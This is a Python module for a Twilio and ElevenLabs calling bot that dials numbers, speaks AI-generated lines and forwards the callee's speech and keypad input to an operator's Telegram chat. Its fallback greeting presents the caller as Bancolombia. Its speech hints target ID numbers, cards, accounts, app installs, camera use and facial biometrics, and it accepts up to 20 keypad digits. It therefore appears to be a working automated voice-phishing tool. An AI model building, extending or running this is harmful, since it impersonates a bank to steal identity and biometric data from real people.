"""
VoIP Manager - Gestión de llamadas con Twilio y ElevenLabs
Refactorizado: código limpio, sin duplicación, solo ElevenLabs
"""

from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from loguru import logger
from config import settings
from datetime import datetime
from typing import Dict, List, TYPE_CHECKING
import asyncio
import time

if TYPE_CHECKING:
    from main import CallerBot


class VoIPManager:
    """Gestor de llamadas VoIP con Twilio y síntesis de voz ElevenLabs"""
    
    def __init__(self, caller_bot: 'CallerBot'):
        """
        Inicializar VoIP Manager con arquitectura optimizada
        
        Args:
            caller_bot: Instancia del bot principal para acceso a componentes
        """
        self.caller_bot = caller_bot
        self.client = None
        self.active_calls: Dict[str, dict] = {}
        self.call_history: List[dict] = []
        self.no_speech_attempts: Dict[str, int] = {}
        self.call_lock = asyncio.Lock()  # Lock para operaciones concurrentes seguras
        
        logger.info("📞 VoIP Manager creado con soporte multi-llamadas")
    
    async def initialize(self):
        """Inicializar cliente de Twilio con validación"""
        try:
            self.client = Client(settings.twilio_account_sid, settings.twilio_auth_token)
            logger.info("✅ Cliente Twilio inicializado correctamente")
        except Exception as e:
            logger.error(f"❌ Error inicializando Twilio: {e}")
            raise
    
    async def make_call(self, to_number: str, telegram_chat_id: int) -> str:
        """
        Iniciar llamada telefónica
        
        Args:
            to_number: Número destino en formato E.164 (+34XXXXXXXXX)
            telegram_chat_id: ID del chat de Telegram para notificaciones
        
        Returns:
            Call SID de Twilio
        
        Raises:
            Exception: Si el cliente no está inicializado o falla la llamada
        """
        if not self.client:
            raise Exception("Cliente Twilio no inicializado")
        
        try:
            webhook_url = f"{settings.webhook_url}/voice/incoming"
            status_callback_url = f"{settings.webhook_url}/voice/status"
            
            call = self.client.calls.create(
                to=to_number,
                from_=settings.twilio_phone_number,
                url=webhook_url,
                method='POST',
                status_callback=status_callback_url,
                status_callback_event=['initiated', 'ringing', 'answered', 'completed'],
                status_callback_method='POST',
                record=False,
                timeout=60
            )
            
            # Registrar llamada activa
            self.active_calls[call.sid] = {
                'sid': call.sid,
                'number': to_number,
                'telegram_chat_id': telegram_chat_id,
                'start_time': datetime.now(),
                'status': 'initiated',
                'transcript': []
            }
            
            # Inicializar contador
            self.no_speech_attempts[call.sid] = 0
            
            logger.info(f"📞 Llamada a: {to_number}")
            return call.sid
            
        except Exception as e:
            logger.error(f"❌ Error al realizar llamada: {e}", exc_info=True)
            raise
    
    async def hangup_call(self, call_sid: str) -> bool:
        """
        Finalizar llamada de forma segura y mover al historial
        
        Args:
            call_sid: ID de la llamada a finalizar
            
        Returns:
            True si se finalizó exitosamente, False si hubo error
        """
        async with self.call_lock:
            try:
                # Intentar finalizar llamada en Twilio
                self.client.calls(call_sid).update(status='completed')
                
                # Mover a historial si existe en activas
                success = False
                if call_sid in self.active_calls:
                    call_data = self.active_calls.pop(call_sid)
                    duration = (datetime.now() - call_data['start_time']).seconds
                    call_data['duration'] = duration
                    call_data['status'] = 'completed'
                    call_data['end_time'] = datetime.now()
                    
                    # Agregar al historial (mantener últimas 100)
                    self.call_history.append(call_data)
                    if len(self.call_history) > 100:
                        self.call_history = self.call_history[-100:]
                    
                    success = True
                
                # Limpiar datos asociados
                if call_sid in self.no_speech_attempts:
                    del self.no_speech_attempts[call_sid]
                
                logger.info(f"🔴 Llamada finalizada: {call_sid[:8]}")
                return True
                
            except Exception as e:
                logger.error(f"❌ Error al colgar llamada {call_sid[:8]}: {e}")
                return False
    
    async def hangup_all_calls(self) -> dict:
        """
        Finalizar todas las llamadas activas
        
        Returns:
            Diccionario con estadísticas: {'success': int, 'failed': int, 'total': int}
        """
        active_call_ids = list(self.active_calls.keys())
        total = len(active_call_ids)
        
        if total == 0:
            return {'success': 0, 'failed': 0, 'total': 0}
        
        logger.info(f"🔴 Finalizando {total} llamadas activas...")
        
        success = 0
        failed = 0
        
        # Finalizar todas las llamadas en paralelo
        tasks = [self.hangup_call(call_sid) for call_sid in active_call_ids]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                success += 1
            else:
                failed += 1
        
        logger.info(f"✅ Finalizadas: {success}/{total} exitosas")
        
        return {'success': success, 'failed': failed, 'total': total}
    
    async def handle_incoming_call(self, call_sid: str) -> str:
        """
        Manejar llamada entrante con ElevenLabs - OPTIMIZADO Y ROBUSTO
        
        Args:
            call_sid: ID de la llamada
        
        Returns:
            TwiML XML con audio de ElevenLabs
        """
        try:
            logger.info(f"📞 PROCESANDO LLAMADA ENTRANTE: {call_sid}")
            
            # Registrar llamada si no existe
            if call_sid not in self.active_calls:
                logger.warning(f"⚠️ Llamada {call_sid[:8]} no registrada previamente, auto-registrando...")
                self.active_calls[call_sid] = {
                    'sid': call_sid,
                    'number': 'Desconocido',
                    'telegram_chat_id': None,
                    'start_time': datetime.now(),
                    'status': 'answered',
                    'transcript': []
                }
                self.no_speech_attempts[call_sid] = 0
            else:
                self.active_calls[call_sid]['status'] = 'answered'
                telegram_chat_id = self.active_calls[call_sid].get('telegram_chat_id')
                phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
                
                # Notificaciones en background
                if telegram_chat_id:
                    asyncio.create_task(self._notify_call_answered(telegram_chat_id, phone_number, call_sid))
            
            # VALIDAR que AI esté disponible
            if not self.caller_bot or not hasattr(self.caller_bot, 'ai_conversation'):
                logger.error("🚨 AI no disponible - usando mensaje predefinido")
                initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
            else:
                # Generar saludo inicial con timeout
                logger.info("🤖 Generando saludo inicial con AI...")
                try:
                    initial_message = await asyncio.wait_for(
                        self.caller_bot.ai_conversation.get_initial_greeting(),
                        timeout=3.0
                    )
                    logger.info(f"💬 Saludo AI generado: '{initial_message[:60]}...'")
                except asyncio.TimeoutError:
                    logger.warning("⏱️ Timeout generando saludo AI - usando fallback")
                    initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
                except Exception as ai_error:
                    logger.error(f"❌ Error AI: {ai_error} - usando fallback")
                    initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
            
            # Registrar en transcript
            if call_sid in self.active_calls:
                self.active_calls[call_sid]['transcript'].append({
                    'speaker': 'ai',
                    'text': initial_message,
                    'timestamp': datetime.now()
                })
            
            # Generar audio con ElevenLabs
            logger.info(f"🎵 Sintetizando audio con ElevenLabs para: '{initial_message[:50]}...'")
            twiml = await self.generate_elevenlabs_twiml(initial_message, call_sid)
            logger.info(f"✅ TwiML generado exitosamente ({len(twiml)} chars)")
            return twiml
            
        except Exception as e:
            logger.error(f"🚨 ERROR CRÍTICO en handle_incoming_call: {e}", exc_info=True)
            # Fallback robusto con Say
            logger.warning("🔄 Usando fallback con Polly.Mia")
            return self._generate_say_twiml("Hola buenos días. ¿Me escuchas bien?")
    
    async def generate_elevenlabs_twiml(self, text: str, call_sid: str) -> str:
        """
        Generar TwiML con ElevenLabs - SIEMPRE
        
        Args:
            text: Texto a sintetizar
            call_sid: ID de la llamada
        
        Returns:
            TwiML con audio de ElevenLabs
        """
        # Intentar 5 veces con ElevenLabs - SOLO ElevenLabs, NADA DE POLLY
        for attempt in range(5):
            try:
                # Crear respuesta TwiML PRIMERO
                response = VoiceResponse()
                
                # Nombre único
                audio_filename = f"call_{call_sid}_{int(datetime.now().timestamp() * 1000)}.mp3"
                
                # Sintetizar con ElevenLabs PURO
                logger.info(f"🎙️ ElevenLabs intento {attempt + 1}/5 - Texto: '{text[:50]}'...")
                audio_bytes = await self.caller_bot.voice_synthesizer.text_to_speech(
                    text,
                    filename=audio_filename
                )
                
                if not audio_bytes or len(audio_bytes) < 1000:
                    raise Exception("Audio muy pequeño o vacío")
                
                logger.info(f"✅ Audio generado: {len(audio_bytes)} bytes")
                
                # Guardar y obtener URL inmediatamente (sin esperar)
                audio_url = f"{settings.webhook_url}/audio/{audio_filename}"
                logger.info(f"📡 URL lista: {audio_url}")
                
                # Gather: VOZ + DTMF - OPTIMIZADO PARA ESCUCHAR MEJOR
                gather = Gather(
                    input='speech dtmf',  # VOZ + TECLADO simultáneo
                    language=settings.language,  # es-CO (Español Colombia)
                    timeout=settings.gather_timeout,  # 4 segundos - tiempo para empezar
                    speech_timeout=settings.speech_timeout,  # auto - escucha hasta que termines
                    speechTimeout=settings.speech_timeout,
                    maxSpeechTime=settings.max_speech_time,  # 45 segundos
                    action='/voice/process_speech',
                    method='POST',
                    profanityFilter=False,  # Sin filtro
                    enhanced=True,  # Reconocimiento mejorado
                    speech_model='phone_call',  # Optimizado para llamadas
                    numDigits=20,  # 20 dígitos máximo
                    # HINTS COLOMBIA - Palabras comunes para mejor reconocimiento
                    hints='sí, si, claro, no, bueno, bien, mal, regular, listo, perfecto, correcto, gracias, por favor, aló, hola, diga, oiga, espere, momento, ya, ahora, cómo, cuándo, dónde, qué, cuál, quién, cero, uno, dos, tres, cuatro, cinco, seis, siete, ocho, nueve, diez, documento, cédula, nombre, teléfono, celular, correo, banco, Bancolombia, cuenta, tarjeta, app, aplicación, descargar, instalar, cámara, foto, entiendo, entendido, pues, vea, aja, ok, vale, dale, confirmar, activar, verificar, SOY YO, biometría, rostro, identidad'
                )
                
                # Play ElevenLabs dentro de Gather
                gather.play(audio_url)
                response.append(gather)
                response.redirect('/voice/process_speech')
                
                logger.info(f"✅ ElevenLabs OK ({len(audio_bytes)} bytes) - DTMF activado")
                return str(response)
                
            except Exception as e:
                logger.error(f"❌ ElevenLabs intento {attempt + 1}/5: {e}")
                if attempt < 4:
                    await asyncio.sleep(0.5)  # Esperar 0.5s entre reintentos
                    continue
                else:
                    # Después de 5 intentos, COLGAR (NO usar Polly)
                    logger.error("🚨 ElevenLabs falló - COLGANDO llamada (NO POLLY)")
                    return self._generate_error_twiml()
    
    async def _notify_call_answered(self, telegram_chat_id: int, phone_number: str, call_sid: str):
        """Notificar en background sin bloquear"""
        try:
            await self.caller_bot.telegram_bot.send_message(
                telegram_chat_id,
                f"✅ CONTESTADA\n📱 {phone_number}\n🆔 {call_sid[:8]}"
            )
        except:
            pass
    
    async def _send_ai_response_to_telegram(self, telegram_chat_id: int, text: str):
        """Enviar respuesta IA a Telegram"""
        try:
            await self.caller_bot.telegram_bot.send_message(
                telegram_chat_id,
                f"🤖 Bot:\n{text}"
            )
        except Exception as e:
            logger.warning(f"Error enviando respuesta IA: {e}")
    
    async def handle_speech_input(self, call_sid: str, speech_text: str, input_type: str = "VOZ") -> str:
        """
        Procesar entrada del usuario (VOZ o DTMF) y generar respuesta INMEDIATA
        
        Args:
            call_sid: ID de la llamada
            speech_text: Texto transcrito (voz o dígitos del teclado)
            input_type: "VOZ" o "DTMF"
        
        Returns:
            TwiML XML con respuesta de audio
        """
        try:
            if call_sid not in self.active_calls:
                logger.warning(f"⚠️ Llamada no encontrada: {call_sid}")
                return self._generate_error_twiml()
            
            # Si no hay entrada, preguntar de nuevo
            if not speech_text or speech_text.strip() == "":
                logger.info(f"🔇 Sin respuesta del usuario en {call_sid}")
                return await self.generate_followup_question(call_sid)
            
            # Resetear contador (usuario respondió)
            self.no_speech_attempts[call_sid] = 0
            
            telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
            
            # Registrar entrada
            self.active_calls[call_sid]['transcript'].append({
                'speaker': 'user',
                'text': speech_text,
                'type': input_type,
                'timestamp': datetime.now()
            })
            
            # Notificar a Telegram con TIPO de entrada
            emoji = "🎤" if input_type == "VOZ" else "⌨️"
            try:
                await self.caller_bot.telegram_bot.send_message(
                    telegram_chat_id,
                    f"{emoji} Usuario ({input_type}):\n{speech_text}"
                )
            except Exception as e:
                logger.warning(f"Error enviando a Telegram: {e}")
            
            # Obtener respuesta IA INMEDIATA (2.0s timeout)
            ai_response = await self.caller_bot.ai_conversation.get_response(
                call_sid,
                speech_text
            )
            
            # Registrar respuesta IA
            self.active_calls[call_sid]['transcript'].append({
                'speaker': 'ai',
                'text': ai_response,
                'timestamp': datetime.now()
            })
            
            # Notificar en background (sin bloquear)
            asyncio.create_task(
                self._send_ai_response_to_telegram(telegram_chat_id, ai_response)
            )
            
            # Generar audio ElevenLabs y responder INMEDIATAMENTE
            return await self.generate_elevenlabs_twiml(ai_response, call_sid)
            
        except Exception as e:
            logger.error(f"❌ Error procesando voz en {call_sid}: {e}", exc_info=True)
            return self._generate_error_twiml()
    
    async def generate_twiml_response(self, text: str, call_sid: str) -> str:
        """
        Generar TwiML con audio de ElevenLabs PURO (NO Polly)
        
        Args:
            text: Texto a sintetizar
            call_sid: ID de la llamada
        
        Returns:
            TwiML string con ElevenLabs PURO
        """
        # Usar el método principal que tiene 5 reintentos y NO usa Polly
        return await self.generate_elevenlabs_twiml(text, call_sid)
    
    async def generate_followup_question(self, call_sid: str) -> str:
        """
        Generar pregunta de seguimiento cuando no hay respuesta del usuario
        
        Args:
            call_sid: ID de la llamada
        
        Returns:
            TwiML con pregunta de seguimiento o comando de colgar
        """
        # Incrementar contador
        self.no_speech_attempts[call_sid] = self.no_speech_attempts.get(call_sid, 0) + 1
        
        current_attempts = self.no_speech_attempts[call_sid]
        max_attempts = settings.no_speech_attempts
        
        logger.warning(
            f"⚠️ Sin respuesta en {call_sid} - "
            f"Intento {current_attempts}/{max_attempts}"
        )
        
        # Si se alcanzó el máximo de intentos, colgar
        if current_attempts >= max_attempts:
            logger.warning(f"🔴 Finalizando llamada {call_sid} - sin respuesta")
            
            # Notificar a Telegram
            if call_sid in self.active_calls:
                telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
                await self.caller_bot.telegram_bot.send_message(
                    telegram_chat_id,
                    f"⚠️ Llamada finalizada\n"
                    f"Sin respuesta después de {max_attempts} intentos"
                )
            
            # Colgar directamente - SIN Polly
            response = VoiceResponse()
            response.hangup()
            return str(response)
        
        # Pregunta de seguimiento basada en el intento
        followup_questions = [
            "¿Aló? ¿Me escuchas?",
            "¿Estás ahí?",
            "¿Hola?",
            "¿Sigues ahí?",
            "¿Me puedes responder?"
        ]
        question = followup_questions[min(current_attempts - 1, len(followup_questions) - 1)]
        
        # Notificar a Telegram
        if call_sid in self.active_calls:
            telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
            await self.caller_bot.telegram_bot.send_message(
                telegram_chat_id,
                f"🔇 Sin respuesta ({current_attempts}/{max_attempts})\n"
                f"🤖 Preguntando: {question}"
            )
        
        return await self.generate_twiml_response(question, call_sid)
    
    async def handle_call_status(self, call_sid: str, call_status: str):
        """
        Manejar actualizaciones de estado de llamada desde Twilio
        
        Args:
            call_sid: ID de la llamada
            call_status: Estado actual (initiated, ringing, in-progress, completed, etc.)
        """
        logger.info(f"📊 Estado de llamada {call_sid[:8]}: {call_status}")
        
        if call_sid in self.active_calls:
            self.active_calls[call_sid]['status'] = call_status
            
            telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
            
            # Mapeo de estados a mensajes con emojis
            status_messages = {
                'initiated': '📞 Llamada iniciada',
                'ringing': '📱 Timbrando...',
                'in-progress': '✅ En curso',
                'completed': '🔴 Finalizada',
                'failed': '❌ Fallida',
                'busy': '📵 Ocupado',
                'no-answer': '📭 No contestó',
                'canceled': '🚫 Cancelada'
            }
            
            message = status_messages.get(call_status, f"📊 Estado: {call_status}")
            
            # Notificar a Telegram
            await self.caller_bot.telegram_bot.send_message(
                telegram_chat_id,
                message
            )
            
            # Si la llamada terminó, mover al historial
            if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
                await self.hangup_call(call_sid)
    
    async def get_active_calls(self) -> List[dict]:
        """
        Obtener lista de llamadas activas con duración
        
        Returns:
            Lista de diccionarios con información de llamadas activas
        """
        calls = []
        for call_sid, call_data in self.active_calls.items():
            duration = (datetime.now() - call_data['start_time']).seconds
            calls.append({
                'sid': call_sid,
                'number': call_data['number'],
                'duration': duration,
                'status': call_data['status'],
                'transcript_length': len(call_data['transcript'])
            })
        return calls
    
    async def get_call_history(self, limit: int = 10) -> List[dict]:
        """
        Obtener historial de llamadas recientes
        
        Args:
            limit: Número máximo de llamadas a retornar
        
        Returns:
            Lista de llamadas históricas (más recientes primero)
        """
        return self.call_history[-limit:][::-1]
    
    async def cleanup(self):
        """Limpiar recursos y finalizar llamadas activas"""
        logger.info("🧹 Limpiando VoIP Manager...")
        
        # Finalizar todas las llamadas activas
        for call_sid in list(self.active_calls.keys()):
            try:
                await self.hangup_call(call_sid)
            except Exception as e:
                logger.error(f"Error finalizando llamada {call_sid}: {e}")
        
        # Limpiar contadores
        self.no_speech_attempts.clear()
        
        logger.info("✅ VoIP Manager limpiado")
    
    # POLLY ELIMINADO COMPLETAMENTE - SOLO ELEVENLABS PURO
    
    def _generate_error_twiml(self) -> str:
        """
        Error crítico - colgar llamada sin Polly
        
        Returns:
            TwiML de error que cuelga directamente
        """
        logger.error("🚨 ERROR CRÍTICO - Colgando llamada (SIN Polly)")
        response = VoiceResponse()
        response.hangup()
        return str(response)
    
    def _generate_say_twiml(self, message: str) -> str:
        """
        Generar TwiML con Say como fallback de emergencia
        
        Args:
            message: Mensaje a decir
        
        Returns:
            TwiML XML con Say
        """
        logger.warning(f"⚠️ Usando Say fallback: {message}")
        response = VoiceResponse()
        gather = Gather(
            input='speech dtmf',
            language='es-CO',
            timeout=3,
            speech_timeout='auto',
            action='/voice/process_speech',
            method='POST'
        )
        gather.say(message, voice='Polly.Mia', language='es-ES')
        response.append(gather)
        response.redirect('/voice/process_speech')
        return str(response)
